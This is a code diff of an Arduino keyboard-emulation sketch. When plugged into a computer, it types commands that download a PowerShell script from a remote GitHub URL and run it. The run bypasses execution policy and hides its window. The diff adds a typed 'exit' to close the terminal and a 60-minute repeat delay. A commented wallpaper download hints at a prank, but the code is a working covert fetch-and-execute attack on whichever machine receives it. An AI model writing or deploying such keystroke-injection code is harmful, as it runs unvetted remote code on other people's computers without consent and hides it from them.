@@ -86,7 +86,7 @@ void openTerminal()
 
 void setup() {
   Serial.begin(9600);
-  delay(5000);
+  delay(2000);
 }
 
 void loop() {
@@ -104,11 +104,12 @@ void loop() {
   Keyboard.print("curl -o scrpt.ps1 https://raw.githubusercontent.com/mkrapf/AMWP/master/script/scrpt.ps1");
   delay(5);
   printKey(KEY_ENTER);
-  delay(1000);
+  delay(600);
   Keyboard.print("powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File scrpt.ps1");
   printKey(KEY_ENTER);
-
-
+  delay(600);
+  Keyboard.print("exit");
+  printKey(KEY_ENTER);
   
   
   /*
@@ -125,10 +126,12 @@ void loop() {
   
   delay(9);
   
-  
+  //wait for 60 minutes
+  delay(3600000);
 
-  // typing too rapidly can overwhelm a PC
-  delay(30000);
+
+  
+  
 }
 
 //  Keyboard.print("curl -o %userprofile%\\Desktop\\wallpaper.jpg \"https://wallpapertag.com/wallpaper/full/d/0/c/716730-popular-funny-monkey-wallpaper-2560x1600.jpg\"");
